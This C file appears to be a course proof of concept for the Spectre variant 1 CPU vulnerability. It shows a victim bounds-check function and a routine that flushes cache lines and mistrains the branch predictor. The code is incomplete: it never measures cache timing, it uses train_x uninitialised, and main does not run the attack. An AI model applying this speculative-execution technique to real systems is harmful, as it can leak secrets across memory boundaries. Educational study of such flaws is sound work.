/**
 * @file main.c
 * @author Matthew Gilpin
 * @brief A proof of concept for Spectre - CVE2017-5753
 * @version 0.1
 * @date 2023-03-12
 * 
 * @cite Spectre Attacks: Exploiting Speculative Execution
 * @link DOI 10.1109/SP.2019.00002
 * This code is heavily based off of the above paper. 
 * 
 */

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <x86intrin.h>


/**
 * @brief Victim code goes here
 * 
 */

uint32_t array1_size = 16;
uint8_t  array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,16};
uint8_t  array2[256 * 512];

char *secret = "The secret COMS4507 password is :\"incorrect\"";
uint8_t tmp = 0;

void victim_function(size_t x) {
    if (x < array1_size) {
        tmp ^= array2[array1[x] * 512];
    }
}

/**
 * End victim code.
 */


void readMemory(size_t target_index, uint8_t value[2], int score[2]) {

    static int results[256];
    size_t train_x, x;
    
    for (int i = 0; i < 256; i++)
        results[i] = 0;

    for (int tries = 999;  tries > 0; tries--) {
        
        // First flush array from cache
        for (int i = 0; i < 256; i++)
            _mm_clflush(&array2[i*512]);

        // Train the BTB 
        for (int i = 29; i >= 0; i--) {
            
            _mm_clflush(&array1_size);
            for (volatile int z = 0; z < 100; z++)
                ;


            // Bit manipulation to reduce branches - would affect
            // branch predictor.
            // Sets x = train_x if (i mod 6 == 0)
            x = ((i % 6) - 1) & ~0xFFFF;
            x = (x | (x >> 16));
            x = train_x ^ (x & (target_index ^ train_x));

            // Victim function
            victim_function(x);
        }   
    }

}


/**
 * @brief Main program
 * 
 */
int main() {
    printf("-- Spectre Demo for COMS4507 Semester 1 2023 --\n");
    printf("-- CVE2017-5753 --\n");

    victim_function(2);

    return 0;
}

